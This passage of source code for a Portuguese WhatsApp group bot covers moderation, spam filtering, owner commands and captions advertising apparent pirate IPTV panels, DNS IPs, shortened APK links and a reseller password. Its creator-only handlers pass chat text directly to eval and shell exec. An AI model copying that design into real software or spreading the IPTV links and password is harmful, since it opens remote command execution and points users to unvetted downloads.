            if (isUrl(body) && isAntiLinkHard && !isGroupAdmins && isBotGroupAdmins) {
                linkgpp = await conn.groupInviteCode(from)
                if (budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')
                if (!isUrl(body)) return
                reply('*Link detectado, punindo usuário...*')
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }
        }
        AntilinkHardF()

        if (isUrl(body) && isAntilinkgp && m.isGroup && isBotGroupAdmins) {
            if (!isAntilinkgp) return
            if (!isUrl(body)) return
            if (isGroupAdmins) return reply("Você é adm, não removerei você..")
            if (budy.includes("chat.whatsapp.com/")) {
                if (!budy.includes("chat.whatsapp.com/")) return
                if (isBot) return
                linkgpp = await conn.groupInviteCode(from)
                if (budy.match(`${linkgpp}`)) return reply('Link do nosso grupo, não irei remover.. ')
                reply('*Link de grupo detectado, punindo usuário...*')
                conn.groupParticipantsUpdate(from, [sender], 'remove')
            }
        }

        if (isCmd && isFiltered(sender) && !m.isGroup) {
            console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))

            return m.reply('*「 ❗ 」Flood detectado, espere 5 segundos*')
        }
        if (isCmd && isFiltered(sender) && m.isGroup) {
            console.log(color('~> [SPAM]', 'red'), color(moment.tz('America/Sao_Paulo').format('HH:mm:ss'), 'yellow'), color(`${command}`), 'DE:', color(pushname))

            return m.reply('*「 ❗ 」Flood detectado, espere 5 segundos*')
        }

        ////////////// comands sem prefix /////////////////////
        if (!isCmd) {
            if (budy.includes("adivinha meu celular") || (budy.includes("Adivinha meu celular") || (budy.includes("Adivinha Meu celular") || (budy.includes("Adivinha Meu Celular") || (budy.includes("bot qual meu celular")))))) {
                adivinha = m.key.id.length > 21 ? 'Android 🤣' : m.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅';
                await conn.sendMessage(from, { text: adivinha }, { quoted: m })
            }
            if (budy.includes("gay") || (budy.includes("Gay") || (budy.includes("GAY")))) {
                await conn.sendMessage(from, { text: 'Você' }, { quoted: m })

            }
if (budy.includes("?SERVIDOR") || (budy.includes("?Servidor") || (budy.includes("?servidor")))) {
                await conn.sendMessage(from, { text: '╭━️⃟き⃟🗃️INFO SERVIDOR🗃️️き                                                                                                                           ▢╭═══⊷                                                                                                                                                  ▢ ⌁ 𖥂 Info (PlayTv) °                                                                                                                                  ▢ ⌁ 𖥂 Info (blade) °                                                                                                                                   ▢ ⌁ 𖥂 Info (bras) °                                                                                                                                    ▢ ⌁ 𖥂 Info (iphone) °                                                                                                                                  ▢ ⌁ 𖥂 Info (club) °                                                                                                                                    ▢ ⌁ 𖥂 Info (Brgf) °                                                                                                                                    ▢ ⌁ 𖥂 Info (Tvs) °                                                                                                                                     ▢ ⌁ 𖥂 Info (P2flix) °                                                                                                                                  ▢ ⌁ 𖥂 Info (Multi) °                                                                                                                                   ▢ ⌁ 𖥂 Info """""" °                                                                                                                                    ▢ ⌁ 𖥂 Info """"" °                                                                                                                                     ▢ ⌁ 𖥂 Info """" °                                                                                                                                      ▢ ⌁ 𖥂 Info """""" °                                                                                                                                    ▢ ⌁ 𖥂 Info """" °                                                                                                                                      ▢ ⌁ 𖥂 Info """" °                                                                                                                                      ▢ ⌁ 𖥂 Info """ °                                                                                                                                       ▢ ⌁ 𖥂 Info """""" °                                                                                                                                    ▢ ⌁ 𖥂 Info """"" °                                                                                                                                    ▢ ╰═══⊷                                                                                                                                                 ╰━━━ ⪨'}, {quoted: m})





            }
if (budy.includes("INFO PLAYTV") || (budy.includes("Info playtv") || (budy.includes("Info PlayTv")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/PlayTv.jpg"), caption: '*LINK DO PAINEL*                                                                                                                                        https://painelplay.top/\n                                                                                                                                 ✅ *APLICATIVOS EM APK**                                                                                                                                *PlayTV XC*                                                                                                                                             https://tinyurl.com/playtvxcmult                                                                                                                        *PlayTV SMARTERS*                                                                                                                                       https://tinyurl.com/texplaysmart                                                                                                                        *Duplex Play versão android*                                                                                                                            https://tinyurl.com/duplexplayapk1                                                                                                                      *XCIPTV PLAYER*                                                                                                                                         https://tiny.one/xciptvplayer                                                                                                                           *IPTV SMARTERS PLATER LITE*                                                                                                                             https://tiny.one/smartersplayer                                                                                                                         *PlayTV SMT SMARTERS NOVO*                                                                                                                              https://tinyurl.com/playtopv3                                                                                                                           *DNS PARA XCIPTV/OTR/SMARTERS PLAYER E OUTROS APPS*\n                                                                                                     http://cdnseven.xyz:8080                                                                                                                                http://playtv.xyz:8080                                                                                                                                  http://playtv2.xyz:8080                                                                                                                                 *DNS STB V2 PARA SAMSUNG SERIE J E OUTROS*\n                                                                                                              *SmartTVs ANTIGAS v2*                                                                                                                                   192.99.55.150                                                                                                                                           *SmartTVs NOVAS v3*                                                                                                                                     45.90.162.149                                                                                                                                           ✅ **WEBPLAYER USAR BROWSER MICROSOFT EDGE* \n                                                                                                             ⚠️ http://playtv.flixvip.xyz/                                                                                                                           ⚠️ http://player.flixvip.xyz/                                                                                                                           ⚠️ http://webtv.isacplay.store                                                                                                                          ✅ *LOJA DE APLICATIVOS PLAYTV* \n                                                                                                                         http://playtv.brstore.site/                                                                                                                             https://tiny.one/lojaplay'}, {quoted: m})


            }
if (budy.includes("INFO BLADE") || (budy.includes("Info blade") || (budy.includes("Info Blade")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/blade.jpg"), caption: '*LINK DO PAINEL*                                                                                                                                        http://gestor.rs\n                                                                                                                                        *LINK DE APK*                                                                                                                                           http://blapp.top/\n                                                                                                                                       *WEBPLAYER*                                                                                                                                             http://playtv.ws/                                                                                                                                       http://playtv.si/\n                                                                                                                                      *EPG* http://x2.rs/epg\n                                                                                                                                  *DNS STB* 51.222.26.99                                                                                                                                  *RECOMENDADO* 144.217.182.47\n                                                                                                                            *DNS SMARTERS*                                                                                                                                          http://cdnrede.com                                                                                                                                      http://bnew.me\n                                                                                                                                          *APLICATIVO NA PLAY STORE FOCOCAM*                                                                                                                      https://play.google.com/store/apps/details?id=com.r.p2foco                                                                                              *EASY TV*                                                                                                                                               https://play.google.com/store/apps/details?id=com.r.easytv                                                                                              *LINK apk*                                                                                                                                              http://bstv.pw/vxzvo'}, {quoted: m})
 }
if (budy.includes("INFO BRAS") || (budy.includes("Info bras") || (budy.includes("Info Bras")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/bras.jpg"), caption: '*LINK DO PAINEL*                                                                                                                                        http://controle.vip/\n                                                                                                                                    *DNS HTTP*                                                                                                                                              http://smart.cms-central.ovh                                                                                                                            *(smarters)*                                                                                                                                            http://painel.cms-central.ovh                                                                                                                           http://cdn.5central.me                                                                                                                                  http://cms-central.co\n                                                                                                                                 *DNS STB*                                                                                                                                               (Modelo novo) 67.43.43.55                                                                                                                               (Modelo antigo) 67.43.43.56                                                                                                                             185.152.66.105                                                                                                                                          142.44.212.34                                                                                                                                           192.99.166.201                                                                                                                                          185.183.34.202'}, {quoted: m})
             
             
}
if (budy.includes("INFO BRAS") || (budy.includes("Info bras") || (budy.includes("Info Bras")))) {
                await conn.sendMessage(from, { text: 'P2BRAS                                                                                                                                                 *APLICATIVOS*                                                                                                                                           *VORTEXP2*                                                                                                                                              https://play.google.com/store/apps/details?id=com.xapp.vortexp2                                                                                         *RM GERENCIAMENTO*                                                                                                                                      https://play.google.com/store/apps/details?id=brstore.site.rmgeren                                                                                      *JK GAMES*                                                                                                                                              https://play.google.com/store/apps/details?id=com.xapp.jkgame                                                                                           *ÁREA VIP*                                                                                                                                              https://play.google.com/store/apps/details?id=brstore.site.viparea                                                                                      *HARD2PLAY*                                                                                                                                             https://play.google.com/store/apps/details?id=com.hard2play.playtop                                                                                     *UNITED*                                                                                                                                                https://play.google.com/store/apps/details?id=com.united.servers\n                                                                                      *Link direto:*                                                                                                                                          http://abrela.me/p2b                                                                                                                                    *Barra Lateral Laranja - Versão 4.9.7*                                                                                                                  http://abrela.me/p2b2                                                                                                                                   *Barra Lateral Azul – Versão 4.9.4*                                                                                                                     http://abrela.me/p2b21                                                                                                                                  *Novo Layout - Versão 5.2*                                                                                                                              http://abre.ai/brp2                                                                                                                                     http://tinyurl.com/p2b492                                                                                                                               *Versão ideal para Mi Box, Mi Stick, Fire Stick*                                                                                                        http://abrela.me/p2b458'}, {quoted: m})
 
 
}
if (budy.includes("INFO BRAS") || (budy.includes("Info bras") || (budy.includes("Info Bras")))) {
                await conn.sendMessage(from, { text: 'CENTRAL\n                                                                                                                                               *IPTV*                                                                                                                                                  *FIVE SMARTERS – LINK DIRETO*                                                                                                                           http://abrela.me/fpro                                                                                                                                   http://abre.sx/fpro                                                                                                                                     *CENTRAL SMARTERS – LINK DIRETO*                                                                                                                        http://abrela.me/cpron                                                                                                                                  http://abre.sx/cpron                                                                                                                                    *CENTRAL STB – LINK DIRETO*                                                                                                                             http://abrela.me/stbcentral                                                                                                                             http://abre.sx/stbcentral'}, {quoted: m})
 
                         
             
                  }  
            if (budy.includes("INFO IPHONE") || (budy.includes("Info iphone") || (budy.includes("info iphone")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/iphone.jpg"), caption: '🤖 *Vamos ao que interessa!*                                                                                                                                                                                                                                                                                    📲 _IOS/IPHONE_ 📲                                                                                                                                                                                                                                                                                                 *APLICATIVOS - IPHONE*                                                                                                                                                                                                                                                                                          *LTVID PRO*                                                                                                                                             https://apps.apple.com/us/app/tvid-pro/id151659573                                                                                                      *IPTV - SMARTERS:*                                                                                                                                      https://apps.apple.com/br/app/iptv-smarters-player/id1383614816                                                                                         *GSE SMART IPTV*                                                                                                                                        https://apps.apple.com/br/app/gse-smart-iptv/id1028734023                                                                                               *2 4 7 IPTV PLAYER*                                                                                                                                     https://apps.apple.com/br/app/247-iptv-player/id1419998058                                                                                              *XSTREAM - PLAYER*                                                                                                                                      https://apps.apple.com/br/app/xtream-iptv/id1491319185                                                                                                  *DMAC - PLAYER*                                                                                                                                          https://apps.apple.com/br/app/dmac-iptv/id1524596259                                                                                                   *FLEX - PLAYER*                                                                                                                                          https://apps.apple.com/br/app/flex-iptv/id1182930255                                                                                                   *GO IPTV M3U PLAYER*                                                                                                                                     https://apps.apple.com/br/app/go-iptv-m3u-player/id1211405632                                                                                          *LeezTv Go*                                                                                                                                              https://apps.apple.com/br/app/leeztv-go/id1448239042                                                                                                   *Mega IPTV*                                                                                                                                              https://apps.apple.com/br/app/mega-iptv-m3u-player/id1491658839\n\n📱NeoPlay Tecnolog'}, { quoted: m })                

 }
if (budy.includes("INFO CLUB") || (budy.includes("Info club") || (budy.includes("Info Club")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/club.jpg"), caption: '*PAINEL CLUB*                                                                                                                                           dashboard.bz\n                                                                                                                                            *Aplicativo CLBSmart (APK)*                                                                                                                             http://cplayer.io/apk/smart                                                                                                                             *Aplicativo CLite (APK)*                                                                                                                                http://cplayer.io/apk/lite\n                                                                                                                            *Webplayer*                                                                                                                                              http://cplayer.io\n                                                                                                                                      *EPG(XML)*                                                                                                                                               http://cepg.so\n                                                                                                                                     *DNS STB*                                                                                                                                               *(Modelo Novo)*                                                                                                                                          212.102.61.80                                                                                                                                          *(Modelo Antigo)*                                                                                                                                        212.102.61.81\n                                                                                                                                      *DNS Smarters/XCIPTV/API*                                                                                                                                http://acsa.ws:80                                                                                                                                       http://acsb.sh:80                                                                                                                                       http://acsc.cc:80                                                                                                                                       http://acsa.ws:80'}, {quoted: m})
            

}
if (budy.includes("INFO BRGF") || (budy.includes("Info Brgf") || (budy.includes("Info brgf")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/brasil.jpg"), caption: '*PAINEL BRASIL GF*                                                                                                                                       https://cms.hptv.live/\n                                                                                                                                *WEBPLAYER*                                                                                                                                             http://bgf.playflix.top/\n                                                                                                                              *DNS DISPONÍVEIS URL*                                                                                                                                    http://hptv.pro:8880\n                                                                                                                                 *DNS STB*                                                                                                                                               185.132.132.6                                                                                                                                           51.79.124.221                                                                                                                                           *(NOVO)*                                                                                                                                                198.50.186.6\n                                                                                                                                          *APK P2P*                                                                                                                                               https://bit.ly/hptvandroidtv'}, {quoted: m})

}
if (budy.includes("INFO TVS") || (budy.includes("Info Tvs") || (budy.includes("Info tvs")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/tvs.jpg"), caption: '*PAINEL TVS*                                                                                                                                            gestor.tv\n                                                                                                                                             *DNS STB*                                                                                                                                               158.69.18.9                                                                                                                                             144.217.61.193\n                                                                                                                                       *IPTV PARA PC*                                                                                                                                           https://tinyurl.com/tvwindows22\n                                                                                                                      *Webplayer*                                                                                                                                              http://alt.p2web.io/                                                                                                                                    http://p2web.io/\n                                                                                                                                     *Nossa DNS*                                                                                                                                              http://supertv.io\n                                                                                                                                     *APK XCIPTV*                                                                                                                                           https://play.google.com/store/apps/details?id=com.nathnetwork.xciptv                                                                                    *SMARTERS(APK)*                                                                                                                                         https://tinyurl.com/xsmarters21\n                                                                                                                      *Aplicativos P2P originais*                                                                                                                              https://bit.ly/appv497                                                                                                                                  https://bit.ly/appv492                                                                                                                                  https://bit.ly/appv455                                                                                                                                  https://bit.ly/appv452'}, {quoted: m})


}
if (budy.includes("INFO P2FLIX") || (budy.includes("Info P2flix") || (budy.includes("Info p2flix")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/p2flix.jpg"), caption: '*PAINEL P2FLIX*                                                                                                                                         https://3em1.p2flix.fun/\n                                                                                                                             *APP NA PLAY STORE*                                                                                                                                      https://play.google.com/store/apps/details?id=com.iptvBlinkPlayer                                                                                      *Apk Via Link*                                                                                                                                           https://abre.ai/camflix\n                                                                                                                              *WebPlayer*                                                                                                                                             http://web.speedbr.fun/                                                                                                                                 *WebPlayer Tipo Netflix*                                                                                                                                 http://play.p2flix.fun\n                                                                                                                                *DNS STB*                                                                                                                                              *(Modelo Novo)*                                                                                                                                          209.14.2.140\n                                                                                                                                          *DNS SMARTERS/XCIPTV/API:*                                                                                                                              http://p2flix.fun:80                                                                                                                                   *SMARTERS*                                                                                                                                               http://speedbr.fun:80                                                                                                                                  *DNS IPTV  SMART ROKU*                                                                                                                                   http://conexaoonline.life:80\n                                                                                                                         *APP P2P APK*                                                                                                                                           *APLIVATIVO NA PLAYSTORE*                                                                                                                                https://play.google.com/store/apps/details?id=com.xplay.turboflix                                                                                      *APLICATIVO VIA APK*                                                                                                                                    https://abre.ai/liteflix                                                                                                                                *APP PLAY STORE*                                                                                                                                        JK GAME'}, {quoted: m})


}
if (budy.includes("INFO MULTI") || (budy.includes("Info Multi") || (budy.includes("Info multi")))) {
                await conn.sendMessage(from, { image: fs.readFileSync("./serv/multi.jpg"), caption: '*PAINEL MULTIHD*                                                                                                                                        https://gerenciador.multihdtv.com/\n                                                                                                                    *MANUAL DO REVENDA*                                                                                                                                     https://abrela.me/uploads/manual/manualmulti1204.pdf                                                                                                    *SENHA* MULTILIVE21\n                                                                                                                                   *DNS SMARTERS*                                                                                                                                          http://tbsrv.me\n                                                                                                                                       *APK P2P MULTI*                                                                                                                                         *Versão 458*                                                                                                                                             http://abrela.me/mp2458                                                                                                                                *Versão 492*                                                                                                                                             http://abrela.me/mp2492\n                                                                                                                              *APK IPTV COMUM*                                                                                                                                        *Perfect The Boys*                                                                                                                                      http://abrela.me/ptb                                                                                                                                    *The Boys Pro*                                                                                                                                          http://abrela.me/tbpro                                                                                                                                 *MultiFast*                                                                                                                                               http://abrela.me/multi                                                                                                                                *MultiXC*                                                                                                                                                http://abrela.me/multixc                                                                                                                               *MultiXCIPTV*                                                                                                                                            http://abrela.me/mxc                                                                                                                                   *MultiFAST*                                                                                                                                             http://abrela.me/mfast                                                                                                                                   *SMARTER*                                                                                                                                               http://abrela.me/mpro                                                                                                                                  *SMARTER  V3*                                                                                                                                            http://abrela.me/mltv3'}, {quoted: m}) 
                
                
}
if (budy.includes("INFO MULTI") || (budy.includes("Info Multi") || (budy.includes("Info multi")))) {
                await conn.sendMessage(from, { text: '*MULTIHD*\n                                                                                                                                               *DNS STB*                                                                                                                                               157.230.202.131                                                                                                                                        *MODELO ANTIGO*                                                                                                                                          167.172.158.193                                                                                                                                        *ALTERNATIVO*                                                                                                                                            165.227.200.198                                                                                                                                         *MODELO NOVO*                                                                                                                                           134.209.73.255                                                                                                                                          *ALTERNATIVO*                                                                                                                                           157.230.202.131                                                                                                                                         *MODELO ANTIGO*                                                                                                                                         167.172.158.193                                                                                                                                         *ALTERNATIVO*                                                                                                                                           165.227.200.198                                                                                                                                        *MODELO NOVO*                                                                                                                                            134.209.73.255'}, {quoted: m})                
                
                
            }
            if (budy.includes("Qual o prefix") || (budy.includes("Qual o Prefix") || (budy.includes("qual o prefix")))) {
                await conn.sendMessage(from, { text: `Seu Prefix e: ${prefix}\nVersão: P7 BOT MD 3.1` }, { quoted: m })
            }








        }
        //////////////EXEC///////////////////
        if (budy.startsWith('=>')) {
            if (!isCreator) return
            function Return(sul) {
                sat = JSON.stringify(sul, null, 2)
                bang = util.format(sat)
                if (sat == undefined) {
                    bang = util.format(sul)
                }
                return m.reply(bang)
            }
            try {
                m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                return console.log(chalk.black(chalk.red('[ EVAL ]')), chalk.green("de " + m.sender.replace("@s.whatsapp.net", "")))
            } catch (e) {
                m.reply(String(e))
            }
        }

        if (budy.startsWith('>')) {
            if (!isCreator) return
            try {
                return reply(JSON.stringify(eval(budy.slice(2)), null, '\t'))
            } catch (e) {
                reply(`${e}`)
            }
        }

        if (budy.startsWith('$')) {
            if (!isCreator) return
            exec(budy.slice(2), (err, stdout) => {
                if (err) return m.reply(err)
                if (stdout) return m.reply(stdout)
            })
            return console.log(chalk.black(chalk.red('[ EVAL ]')), chalk.green("de " + m.sender.replace("@s.whatsapp.net", "")))
        }


        ////////////////////////////




        if (isCmd) cmdadd()

        if (isBanned) return
        BannedExpired(ban)
        if (isCmd) addFilter(sender)
        if (isCmd) {
            if (iscmdban) return m.reply(`_Comando ${command} foi bloqueado pelo meu dono._`)
        }
        if (!m.isGroup && !isCreator && isCmd && banChats === true) {
            return m.reply(`Olá ${pushname} o antipv está ativado, fale com meu criador para saber mais...\n\nwa.me/558198539583\n`), console.log(chalk.black(chalk.red('[ FALANDO COM O ANTIPV  ]')), chalk.red("Numero: " + m.sender.replace("@s.whatsapp.net", "")))
        }


        const figura = Object.keys(m.message)[0] == "stickerMessage" ? m.message.stickerMessage.fileSha256.toString('base64').replace(/,/g, '') : ""
        switch (figura) {

            case '173218210128126158165961260126219158232134291931401121666665248244154331233143351472':
                reply('sumiu')
                break
            case '1142162456190995818525442462291112242459817294188223217135194321024925246140190123200':
                m.reply('Bem te vi')
                break

            case '1231432022351585614200104122354832160107103159164734191190671372245184148162214165127':
                m.reply('tu e doido kkkk deu trabalho p kct')
                break

        }


        if (!m.isGroup && isCmd) console.log(chalk.black(chalk.green('[ CMD EM PV ]')), chalk.black(chalk.white(budy || m.mtype)), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender.replace("@s.whatsapp.net", "")) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
        if (!m.isGroup && !isCmd) console.log(chalk.black(chalk.red('[ MSG EM PV ]')), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
        if (m.isGroup && isCmd) console.log(chalk.black(chalk.green('[ CMD EM GP ]')), chalk.black(chalk.white(budy || m.mtype)), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender.replace("@s.whatsapp.net", "")) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))
        if (m.isGroup && !isCmd) console.log(chalk.black(chalk.red('[ MSG EM GP ]')), chalk.black(chalk.white("As " + hours + ":" + minutes + ":" + seconds + ",", "do dia " + date + "/" + month + "/" + year)) + '\n' + chalk.magenta('=> De'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Em'), chalk.green(m.isGroup ? pushname : 'Pv', m.chat.replace("@s.whatsapp.net", "")))

        switch (command) {



            case 'reage':
            case 'reagir':
                if (!isPremium) return reply(enviar.msg.premium)
                if (!quoted) return reply('marca uma msg')
                if (!text) return reply(`[❗] Use assim : ${prefix + command} 🏮`)
                try {
                    conn.relayMessage(m.chat, {
                        reactionMessage: {
                            key: {
                                id: m.quoted.id,
                                remoteJid: m.chat,
                                fromMe: true
                            },
                            text: c
                        }
                    }, { messageId: m.id })

                } catch { }

                break


            case 'dono2':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono2 = body.slice(8)
                nescessario.dono2 = dono2
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um segundo dono(a) alterado com sucesso para: ${dono2}`)
                break

            case 'dono3':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono3 = body.slice(8)
                nescessario.dono3 = dono3
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um terceiro dono(a) alterado com sucesso para: ${dono3}`)
                break

            case 'dono4':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono4 = body.slice(8)
                nescessario.dono4 = dono4
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um quarto dono(a) alterado com sucesso para: ${dono4}`)
                break

            case 'dono5':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono5 = body.slice(8)
                nescessario.dono5 = dono5
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um quinto dono(a) alterado com sucesso para: ${dono5}`)
                break

            case 'dono6':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono6 = body.slice(8)
                nescessario.dono6 = dono6
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um sexto dono(a) alterado com sucesso para: ${dono6}`)
                break

            case 'dono7':
                if (args.length < 1) return
                if (!isDonoori) return reply(enviar.msg.ownerB)
                dono7 = body.slice(8)
                nescessario.dono7 = dono7
                fs.writeFileSync('./dono/nescessario.json', JSON.stringify(nescessario, null, '\t'))
                reply(`Agora contem um setimo dono(a) alterado com sucesso para: ${dono7}`)
                break

            case 'setprefix':
                if (args.length < 1) return
                if (args.length > 1) return
                if (!isCreator) return reply(enviar.msg.ownerB)
                prefix = args[0]
                setting.prefix = prefix
                fs.writeFileSync('./dono/settings.json', JSON.stringify(setting, null, '\t'))
                reply(`O prefixo foi alterado com sucesso para: ${prefix}`)
                break

            case 'listapv':
            case 'listpv': {
                if (!isCreator) return reply(enviar.msg.donosmt)

                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let teks = `≡ *LISTA DE PV*\n\nTotal de Bate-papos : ${anu.length}\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    teks += ` ❉─────────────────────❉\n• *🔖Nome* : ${nama}\n• *🛡️ID* : ${i}\n• *🏮Chat* : https://wa.me/${i.split('@')[0]}\n❉─────────────────────❉\n\n`
                }
                conn.sendTextWithMentions(m.chat, teks, m)
            }
                break
            case 'listagp':
            case 'listgp': {
                if (!isCreator) return reply(enviar.msg.donosmt)

                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let teks = `≡ *LISTA DE GRUPOS*\n\nTotal : ${anu.length}\n\n`
                for (let i of anu) {
                    let metadata = await conn.groupMetadata(i)
                    teks += `❉─────────────────────❉\n• *🔖Nome* : ${metadata.subject}\n• *🛡️Dono* : @${metadata.owner.split('@')[0]}\n• *🛡️ID :* ${metadata.id}\n°️ *🗓️Criado:* ${moment(metadata.creation * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n° *👥Membros :* ${metadata.participants.length}\n❉─────────────────────❉\n\n`
                }
                conn.sendTextWithMentions(m.chat, teks, m)
            }
                break


            case 'unblockcmd':
                if (!isCreator) return reply(enviar.msg.donosmt)


                blockcmds.splice(`${c}`, 1)
                try {
                    fs.writeFileSync('./datab/data/cmdban.json', JSON.stringify(blockcmds))
                    m.reply(`${c} foi removido da lista de comandos bloqueados`)

                } catch { reply('Deu erro Tenta dnv') }
                break

            case 'blockcmd':
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (/blockcmd/.test(c)) return m.reply('Você não pode banir o comando de banir comandos')
                if (/unblockcmd/.test(c)) return m.reply('Você não pode banir o comando de banir comandos')
                if (/menu/.test(c)) return m.reply('Você não pode banir o comando do menu')
                if (/ping/.test(c)) return m.reply('Você não pode banir o comando do ping')
                if (/eval/.test(c)) return m.reply('Você não pode banir o comando do eval')
                if (/acess/.test(c)) return m.reply('Você não pode banir o comando do acess')






                blockcmds.push(`${c}`)
                fs.writeFileSync('./datab/data/cmdban.json', JSON.stringify(blockcmds))
                m.reply(`${c} foi adicionado a lista de comandos bloqueados`)

                break

            case 'blockcmdlist':
                if (!isCreator) return reply(enviar.msg.donosmt)

                tkks = '╭────*「 *COMANDOS BLOQUEADOS* 」\n'
                for (let V of blockcmds) {
                    tkks += `│+  @${V.split('@')[0]}\n`
                }
                tkks += `│+ Total : ${blockcmds.length}\n╰──────*「 *${setting.NomeDoBot}* 」*────`
                reply(tkks.trim())
                break


            case 'block':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                pru = '.\n'
                for (let _ of mentioned) {
                    pru += `@${_.split('@')[0]}\n`
                }
                ban.push(`${mentioned}`)
                fs.writeFileSync('./datab/user/banned.json', JSON.stringify(ban))
                susp = `🚫@${mentioned[0].split('@')[0]} foi banido e não poderá mais usar os comandos do bot🚫`
                mentions(`${susp}`, mentioned, true)
                break

            case 'unblock':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return
                mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
                pru = '.\n'
                for (let _ of mentioned) {
                    pru += `@${_.split('@')[0]}\n`
                }
                ban.splice(`${mentioned}`)
                fs.writeFileSync('./datab/user/banned.json', JSON.stringify(ban))
                susp = `❎@${mentioned[0].split('@')[0]} foi desbanido e poderá novamente usar os comandos do bot❎`
                mentions(`${susp}`, mentioned, true)
                break

            case 'blocklist':
                jrc = 'ESTA É A LISTA DE NÚMEROS BLOQUEADOS :\n\n'
                for (let benn of ban) {
                    jrc += `╚» @${benn.split('@')[0]}\n`
                }
                jrc += `\n`
                jrc += `Total : ${ban.length}`
                conn.sendMessage(from, { contextInfo: { "mentionedJid": ban }, text: `${jrc.trim()}`, quoted: m })
                break

            case 'bannumero': {
                if (!isCreator) return reply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Não sou besta de banir eu mesmo né 🙁, mas estou decepcionado com você')
                if (numerodonobb.includes(users)) return reply('Não posso banir meu dono 🤧')
                try {
                    await conn.updateBlockStatus(users, 'block')
                } catch {
                    await reply('erro ao banir')
                }
            }
                break
            case 'unbannumero': {
                if (!isCreator) return reply(mess.owner)
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (users === '@s.whatsapp.net') return reply('Marca Alguem ou coloca o numero')
                if (users.length < 20) return reply('Insira um Numero Valido')
                if (botNumber.includes(users)) return reply('Como eu vou me desbanir Jegue?')
                try {

                    await conn.updateBlockStatus(users, 'unblock')
                } catch {
                    await reply('Erro ao Desbanir')
                }
            }
                break

            case 'bangp':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                if (isBanchat) return reply(`Este grupo ja está banido`)
                bancht.push(from)
                fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
                reply(`Grupo banido com sucesso`)
                break

            case 'unbangp':
                if (!isGroup) return reply(enviar.msg.grupo)
                if (!isCreator) return reply(enviar.msg.donosmt)
                let cur = bancht.indexOf(from)
                bancht.splice(cur, 1)
                fs.writeFileSync('./datab/grupos/banchat.json', JSON.stringify(bancht))
                reply(`Grupo desbanido...`)
                break
            case 'antipv':
                if (!isCreator) return m.reply('So Meu Dono')
                buttonsi = [
                    { buttonId: `${prefix}varantipvoff`, buttonText: { displayText: '🔑 DESATIVAR' }, type: 1 },
